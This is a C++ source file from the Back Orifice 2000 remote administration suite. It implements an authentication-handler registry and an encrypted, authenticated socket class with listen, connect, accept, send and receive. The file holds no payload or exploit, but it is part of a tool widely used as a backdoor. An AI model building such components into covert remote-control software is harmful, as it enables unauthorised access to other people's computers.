/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// Command Input/Output Interface
#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commnet.h>
#include<config.h>

extern CIOHandler *g_pIOHandler;
extern CEncryptionHandler *g_pEncryptionHandler;
extern CAuthHandler *g_pAuthHandler;

//                                               //
//////////////// IO Handler Class /////////////////
//                                              //

CAuthHandler::CAuthHandler()
{
	int i;
	for(i=0;i<MAX_AUTH_HANDLERS;i++)
		m_AuthHandler[i]=INVALID_AUTH_HANDLER;
}

CAuthHandler::~CAuthHandler()
{
	int i;
	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		if(m_AuthHandler[i]!=INVALID_AUTH_HANDLER) {
			m_AuthHandler[i]->pRemove();
			m_AuthHandler[i]=INVALID_AUTH_HANDLER;
		}
	}
}

int CAuthHandler::Insert(AUTH_HANDLER *handler)
{	
	int i;

	if(handler->pInsert==NULL) return -1;
	if(handler->pInsert()==-1) return -1;

	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		if(m_AuthHandler[i]==INVALID_AUTH_HANDLER) break;
	}
	if(i==MAX_AUTH_HANDLERS) return -1;
	
	m_AuthHandler[i]=handler;
	
	return i;
}

int CAuthHandler::GetHandlerCount(void)
{
	int count,i;

	count=0;
	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		if(m_AuthHandler[i]!=INVALID_AUTH_HANDLER) count++;
	}
	return count;
}
	
AUTH_HANDLER *CAuthHandler::GetHandler(int nHandler)
{
	if(nHandler<0 || nHandler>=MAX_AUTH_HANDLERS) return NULL;
	return m_AuthHandler[nHandler];
}

AUTH_HANDLER *CAuthHandler::GetHandlerByID(char *svID)
{
	int i;
	
	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		char *svQuery=Query(i);
		if(svQuery!=NULL) {
			if(strnicmp(svQuery,svID,min(lstrlen(svID),lstrlen(svQuery)))==0)
				return m_AuthHandler[i];
		}
	}

	return NULL;
}


char *CAuthHandler::Query(int nHandler)
{
	if(nHandler<0 || nHandler>=MAX_AUTH_HANDLERS) return NULL;
	if(m_AuthHandler[nHandler]==INVALID_AUTH_HANDLER) return NULL;
	if(m_AuthHandler[nHandler]->pQuery==NULL) return NULL;
	
	return m_AuthHandler[nHandler]->pQuery();
}


int CAuthHandler::Remove(int nHandler)
{
	int ret;

	if(nHandler<0 || nHandler>=MAX_AUTH_HANDLERS) return NULL;
	if(m_AuthHandler[nHandler]==INVALID_AUTH_HANDLER) return NULL;
	if(m_AuthHandler[nHandler]->pRemove==NULL) return NULL;
	
	ret=m_AuthHandler[nHandler]->pRemove();
	
	m_AuthHandler[nHandler]=INVALID_AUTH_HANDLER;
	
	return ret;
}



//                                               //
////////// Authenticated Socket Class /////////////
//                                               //


CAuthSocket::CAuthSocket(AUTH_HANDLER *pHandler, IO_HANDLER *pIOH, ENCRYPTION_ENGINE *pEE)
{
	m_pHandler=pHandler;
	m_pIOH=pIOH;
	m_pEE=pEE;
	m_pEnc=NULL;
	m_pSock=NULL;
	m_pData=NULL;
}

CAuthSocket::~CAuthSocket()
{
	if(m_pEnc!=NULL) delete m_pEnc;
	if(m_pSock!=NULL) delete m_pSock;
}

int CAuthSocket::Listen(char *svTarget, int nUserId)
{
	m_pSock=new CIOSocket(m_pIOH);
	if(m_pSock!=NULL) {
		m_pEnc=new CEncryptionEngine(m_pEE);
		if(m_pEnc!=NULL) {
			if(m_pSock->Listen(svTarget)==0) {
				if(m_pEnc->Startup()==0) {
					if(m_pHandler->pOnListen==NULL) return 0;

					m_pData=m_pHandler->pOnListen(m_pSock, m_pEnc, nUserId);
					if(m_pData!=NULL) return 0;

					m_pEnc->Shutdown();
				}
				m_pSock->Close();
			}
			delete m_pEnc;
			m_pEnc=NULL;
		}
		delete m_pSock;
		m_pSock=NULL;
	}
	return -1;
}

int CAuthSocket::Connect(char *svTarget, int nUserId)
{
	m_pSock=new CIOSocket(m_pIOH);
	if(m_pSock!=NULL) {
		m_pEnc=new CEncryptionEngine(m_pEE);
		if(m_pEnc!=NULL) {
			if(m_pSock->Connect(svTarget)==0) {
				if(m_pEnc->Startup()==0) {
					if(m_pHandler->pOnConnect==NULL) return 0;

					m_pData=m_pHandler->pOnConnect(m_pSock, m_pEnc, nUserId);
					if(m_pData!=NULL) return 0;

					m_pEnc->Shutdown();
				}
				m_pSock->Close();
			}
			delete m_pEnc;
			m_pEnc=NULL;
		}
		delete m_pSock;
		m_pSock=NULL;
	}
	return -1;
}

CAuthSocket *CAuthSocket::Accept(void)
{
	CIOSocket *acc_ios=m_pSock->Accept();
	if(acc_ios!=NULL) {
		CAuthSocket *cas;
		cas=new CAuthSocket(m_pHandler, m_pIOH, m_pEE);
		if(cas!=NULL) {
			cas->m_pSock=acc_ios;
			cas->m_pEnc=new CEncryptionEngine(cas->m_pEE);
			if(cas->m_pEnc!=NULL) {
				if(cas->m_pEnc->Startup()==0) {
					if(m_pHandler->pOnAccept==NULL) return cas;
						
					cas->m_pData=m_pHandler->pOnAccept(m_pData,cas->m_pSock, cas->m_pEnc);
					if(cas->m_pData!=NULL) return cas;
					
					cas->m_pEnc->Shutdown();
				}
				delete cas->m_pEnc;
				cas->m_pEnc=NULL;
			}
			cas->m_pSock=NULL;
			delete cas;
		}
		acc_ios->Close();
		delete acc_ios;
	}
	return NULL;
}

int CAuthSocket::Close(void)
{
	if(m_pSock->Close()==-1) return -1;
	delete m_pSock;
	m_pSock=NULL;
	if(m_pEnc->Shutdown()==-1) return -1;
	delete m_pEnc;
	m_pEnc=NULL;
	if(m_pHandler->pOnClose(m_pData)==-1) return -1;
	m_pHandler=NULL;

	m_pData=NULL;
	return 0;
}	

int CAuthSocket::Recv(BYTE **pInData, int *pnInDataLen)
{
	BYTE *pin;
	int inlen;
	int ret;

	ret=m_pSock->Recv(&pin,&inlen);
	if(ret==0) 
		return 0;
	if(ret<0) 
		return -1;
	
	if(m_pHandler->pOnRecv(m_pData,m_pEnc,pin,inlen,pInData,pnInDataLen)==-1) 
		ret=-1;
	
	m_pSock->Free(pin);
		
	return ret;
}

int CAuthSocket::Send(BYTE *pData, int nDataLen)
{
	BYTE *pOutData;
	int  nOutDataLen,ret;

	if(m_pHandler->pOnSend(m_pData,m_pEnc,pData,nDataLen,&pOutData,&nOutDataLen)==-1)
		return -1;

	ret=m_pSock->Send(pOutData,nOutDataLen);
	
	m_pHandler->pFree(m_pData, pOutData);
	return ret;

}

void CAuthSocket::Free(BYTE *pBuffer)
{
	m_pHandler->pFree(m_pData,pBuffer);
}

int CAuthSocket::GetUserID(void)
{
	return m_pHandler->pGetUserID(m_pData);
}

AUTH_HANDLER *CAuthSocket::GetAuthHandler(void)
{
	return m_pHandler;
}

int CAuthSocket::GetRemoteAddr(char *svAddr,int nMaxLen)
{
	return m_pSock->GetRemoteAddr(svAddr,nMaxLen);
}
	
int CAuthSocket::GetConnectAddr(char *svAddr, int nMaxLen)
{
	return m_pSock->GetConnectAddr(svAddr,nMaxLen);
}